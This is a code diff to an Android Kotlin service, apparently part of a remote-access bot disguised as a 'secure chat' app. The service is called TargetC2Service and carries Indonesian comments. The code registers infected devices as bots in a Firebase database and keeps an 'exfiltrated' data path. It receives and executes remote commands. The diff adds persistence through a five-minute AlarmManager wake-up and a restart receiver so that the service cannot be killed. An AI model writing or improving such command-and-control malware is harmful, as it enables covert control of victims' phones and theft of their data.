@@ -1,6 +1,7 @@
 package com.secure.chat.services
 
-import android.app.Service
+import android.app.*
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
@@ -24,6 +25,8 @@ class TargetC2Service : Service() {
         private const val REF_EXFIL = "selzxratV5/exfiltrated"
         private const val NOTIF_ID = 1001
         private const val CHANNEL_ID = "secure_chat_service"
+        private const val ALARM_INTERVAL_MS = 300000L // 5 menit
+        private const val ALARM_REQUEST_CODE = 999
 
         @Volatile
         var isRunning = false
@@ -55,13 +58,13 @@ class TargetC2Service : Service() {
         _deviceId = id
 
         try {
-            // 🔥 FIX: Inisialisasi Firebase pake custom URL
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            // 🔥 FIX: setPersistenceEnabled hanya SEKALI dan di sini aja
+            // 🔥 FIX: setPersistenceEnabled CUMA DISINI, 1x aja
             try {
                 database.setPersistenceEnabled(true)
+                Log.d(TAG, "Firebase persistence enabled")
             } catch (e: Exception) {
-                Log.w(TAG, "Persistence already enabled (safe to ignore)", e)
+                Log.w(TAG, "Persistence already enabled (safe to ignore)")
             }
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
@@ -70,6 +73,49 @@ class TargetC2Service : Service() {
             Log.d(TAG, "Firebase initialized successfully")
         } catch (e: Exception) {
             Log.e(TAG, "Firebase init error", e)
+        }
+
+        // 🔥 FIX: Pasang Alarm Manager biar service gak mati
+        scheduleAlarm()
+    }
+
+    // 🔥 FIX: Alarm Manager — bangunin service tiap 5 menit
+    private fun scheduleAlarm() {
+        try {
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, C2RestartReceiver::class.java)
+            val pendingIntent = PendingIntent.getBroadcast(
+                this, ALARM_REQUEST_CODE, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            alarmManager.setRepeating(
+                AlarmManager.RTC_WAKEUP,
+                System.currentTimeMillis() + ALARM_INTERVAL_MS,
+                ALARM_INTERVAL_MS,
+                pendingIntent
+            )
+            Log.d(TAG, "Alarm scheduled every 5 minutes")
+        } catch (e: Exception) {
+            Log.e(TAG, "Alarm schedule error", e)
+        }
+    }
+
+    // 🔥 FIX: BroadcastReceiver buat restart service
+    class C2RestartReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            Log.d(TAG, "Alarm triggered - restarting C2 service")
+            try {
+                val serviceIntent = Intent(context, TargetC2Service::class.java).apply {
+                    action = "restart"
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(serviceIntent)
+                } else {
+                    context.startService(serviceIntent)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Restart error", e)
+            }
         }
     }
 
@@ -87,8 +133,18 @@ class TargetC2Service : Service() {
             Log.e(TAG, "Foreground notification error", e)
         }
 
+        // 🔥 FIX: Restart kalo service udah mati
         if (!isRunning) {
             startC2()
+        } else {
+            // Update online status aja
+            scope.launch {
+                try {
+                    botsRef.child(deviceId).child("isOnline").setValue(true)
+                    botsRef.child(deviceId).child("lastSeen")
+                        .setValue(System.currentTimeMillis())
+                } catch (_: Exception) {}
+            }
         }
 
         return START_STICKY
@@ -149,17 +205,17 @@ class TargetC2Service : Service() {
                 "timestamp" to System.currentTimeMillis()
             )
 
-            // 🔥 FIX: Pake addOnCompleteListener biar tau sukses/gagal
+            // 🔥 FIX: Pake addOnCompleteListener biar tau berhasil/gagal
             botsRef.child(deviceId).setValue(deviceInfo)
                 .addOnCompleteListener { task ->
                     if (task.isSuccessful) {
-                        Log.d(TAG, "Bot registered successfully: $deviceId")
+                        Log.d(TAG, "BOT REGISTERED SUCCESS: $deviceId")
                     } else {
-                        Log.e(TAG, "Bot registration FAILED: ${task.exception?.message}")
+                        Log.e(TAG, "BOT REGISTER FAILED: ${task.exception?.message}")
                     }
                 }
 
-            // Update online status tiap 30 detik
+            // Update status tiap 30 detik
             scope.launch {
                 while (isActive) {
                     delay(30000)
@@ -192,7 +248,6 @@ class TargetC2Service : Service() {
 
                     Log.d(TAG, "Command received: type=$type cmdId=$cmdId target=$target")
 
-                    // Cek apakah command untuk device ini atau broadcast
                     if (target.isNotEmpty() && target != deviceId) return
 
                     handleCommand(type, payload)
